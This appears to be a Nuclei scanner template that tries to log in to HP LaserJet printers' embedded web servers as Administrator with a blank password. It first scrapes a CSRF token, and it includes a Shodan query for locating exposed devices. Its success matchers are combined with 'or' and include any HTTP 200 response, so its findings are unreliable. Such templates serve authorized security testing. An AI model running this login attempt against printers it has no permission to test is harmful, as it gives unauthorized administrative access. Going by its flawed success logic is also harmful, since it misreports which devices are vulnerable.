id: hp-printer-default-login

info:
  name: Hewlett Packard LaserJet Printer 默认口令登录（弱口令）
  author: JohnAsbjorn
  severity: high
  description: |
    该模板通过尝试 Hewlett Packard LaserJet Printer 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://h30434.www3.hp.com/t5/Printing-Errors-or-Lights-Stuck-Print-Jobs/What-is-the-user-name-and-password-in-Embedded-Web-Server/td-p/6165417
  metadata:
    verified: true
    shodan-query: html:"hp/device/SignIn/Index"
    max-request: 2
  tags: hp,printer,default-login,intrusive,vuln

http:
  - raw:
      - |
        GET /hp/device/SignIn/Index HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Accept-Language: en

    extractors:
      - type: regex
        name: token
        part: body
        group: 1
        regex:
          - 'id="CSRFToken" name="CSRFToken" value="([^"]+)"'
        internal: true

  - raw:
      - |
        POST /hp/device/SignIn/Index HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Type: application/x-www-form-urlencoded
        Origin: {{RootURL}}
        Referer: {{RootURL}}/hp/device/SignIn/Index

        CSRFToken={{token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In

    redirects: true
    max-redirects: 2

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "User: Administrator"
          - "Sign out"
        condition: and

      - type: regex
        part: header
        regex:
          - 'Set-Cookie: .*session.*'

      - type: status
        status:
          - 200
